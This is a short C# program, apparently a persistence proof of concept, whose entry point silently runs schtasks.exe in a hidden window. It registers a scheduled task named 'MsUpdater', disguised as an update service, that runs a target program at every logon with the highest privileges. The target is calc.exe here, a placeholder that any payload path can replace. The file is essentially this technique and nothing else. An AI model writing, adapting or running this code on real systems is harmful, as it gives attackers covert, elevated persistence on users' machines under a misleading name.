namespace Expander
{
    using System;
    using System.Diagnostics;
    using System.IO;

    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            var target = @"C:\Windows\System32\calc.exe";

            Process.Start(new ProcessStartInfo
                              {
                                  FileName = "schtasks.exe",
                                  Arguments = $"/CREATE /TN MsUpdater /TR {target} /SC ONLOGON /RL HIGHEST",
                                  WindowStyle = ProcessWindowStyle.Hidden
                              });
        }
    }
}